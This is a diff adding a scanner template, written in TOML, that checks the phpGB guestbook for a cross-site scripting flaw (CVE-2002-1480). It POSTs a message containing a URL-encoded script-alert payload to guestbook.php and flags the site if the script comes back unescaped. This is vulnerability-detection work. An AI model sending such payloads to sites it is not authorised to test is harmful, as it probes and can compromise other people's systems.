@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "检测 phpGB 留言本系统是否存在跨站脚本攻击（XSS）漏洞，通过向留言板提交包含 JavaScript 脚本的留言内容，验证系统是否对用户输入进行适当过滤和转义。"
+id = "POC-AVE-2002-0601"
+name = "phpGB 留言本系统 跨站脚本攻击漏洞 PoC"
+severity = "medium"
+tags = ["ave-2002-0601"]
+vuln_id = [
+    "CVE-2002-1480",
+    "AVE-2002-0601",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/guestbook.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=test&email=test%40test.com&message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&submit=Submit"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
